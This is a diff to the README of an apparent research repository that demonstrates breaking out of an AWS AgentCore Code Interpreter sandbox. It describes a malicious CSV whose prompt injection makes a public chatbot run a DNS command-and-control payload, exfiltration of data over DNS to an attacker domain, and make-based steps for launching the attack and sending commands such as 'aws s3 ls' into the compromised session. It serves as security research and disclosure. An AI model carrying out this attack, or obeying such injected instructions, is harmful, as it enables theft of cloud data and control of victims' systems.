@@ -67,7 +67,70 @@ Large outputs split into multiple chunks (60 chars max per label):
   Chunk 22: 1.22.22.1256.dGVzLXVzLWVhc3QtMS00NDU1NzA5MjEyOTg-.1.sess_abc123.c2.bt-research-control.com
 ```
 
-## Quick Start Guide
+## Project Structure
+
+This repository now contains two separate infrastructures to demonstrate a realistic attack scenario:
+
+```
+agentcore-sandbox-breakout/
+├── attacker-infra/          # Attacker's AWS account
+│   ├── terraform/           # C2 server infrastructure (EC2, Route53, DNS)
+│   ├── src/                 # Attack tools and C2 client
+│   │   ├── attacker_shell.py    # Operator interface
+│   │   ├── attack_client.py     # HTTP client for prompt injection
+│   │   ├── csv_payload_generator.py  # Malicious CSV generator
+│   │   └── payload_client.py    # Payload for Code Interpreter
+│   └── Makefile
+│
+├── victim-infra/            # Victim's AWS account
+│   ├── terraform/           # Chatbot infrastructure (ECS, ALB, AgentCore)
+│   ├── chatbot/             # Vulnerable FastAPI application
+│   └── Makefile
+│
+├── shared/                  # Shared code (DNS protocol)
+├── docs/                    # Technical specifications
+└── Makefile                 # Root Makefile for orchestration
+```
+
+## Realistic Attack Demo (No Credentials Required)
+
+The enhanced demo shows that an attacker with **NO AWS credentials** to the victim's account can exfiltrate sensitive data. The attack flow:
+
+1. **Attacker** deploys C2 server infrastructure
+2. **Victim** has a publicly-accessible AI chatbot (uses AgentCore Code Interpreter)
+3. **Attacker** sends malicious CSV with prompt injection to victim's public API
+4. **Chatbot** passes CSV to Code Interpreter for analysis
+5. **Prompt injection** triggers DNS C2 payload execution
+6. **Data exfiltrates** via DNS to attacker's C2 server
+
+### Quick Start (Realistic Demo)
+
+```bash
+# Terminal 1: Deploy attacker infrastructure
+cd attacker-infra
+make terraform-yolo
+source set_env_vars.sh
+
+# Terminal 2: Deploy victim infrastructure (separate AWS account recommended)
+cd victim-infra
+make deploy
+
+# Terminal 1: Launch attack
+make attack TARGET=$(cd ../victim-infra/terraform && terraform output -raw chatbot_url)
+
+# Terminal 1: Interact with compromised session
+make operator
+# In operator shell:
+# > send whoami
+# > send aws s3 ls
+# > send aws dynamodb list-tables
+```
+
+---
+
+## Original Quick Start Guide (Direct Code Interpreter Access)
+
+This method requires direct access to a Code Interpreter (i.e., AWS credentials).
 
 ### Prerequisites
 
@@ -77,13 +140,13 @@ Large outputs split into multiple chunks (60 chars max per label):
 
 ### Step 1: Deploy Infrastructure
 
-First, you will need to edit the `terraform/terraform.tfvars` file to set your domain name and AWS region. Set the following environment variables with your own domain and append them to `terraform/terraform.tfvars`:
+First, you will need to edit the `attacker-infra/terraform/terraform.tfvars` file to set your domain name and AWS region. Set the following environment variables with your own domain and append them to `attacker-infra/terraform/terraform.tfvars`:
 
 ```bash
 export DOMAIN_NAME="bt-research-control.com"
 export REGION="us-east-1"
 export BUCKET_NAME="agentcore-hacking"
-cat << EOF >> terraform/terraform.tfvars
+cat << EOF >> attacker-infra/terraform/terraform.tfvars
 domain_name = "${DOMAIN_NAME}"
 aws_region = "${REGION}"
 # This creates two buckets - one with the name, and one suffixed with -sensitive-data
@@ -94,6 +157,8 @@ EOF
 Run the following commands to deploy the infrastructure and configure the EC2 instance.
 
 ```bash
+cd attacker-infra
+
 # 1. Deploy infrastructure
 make terraform-yolo
 source set_env_vars.sh
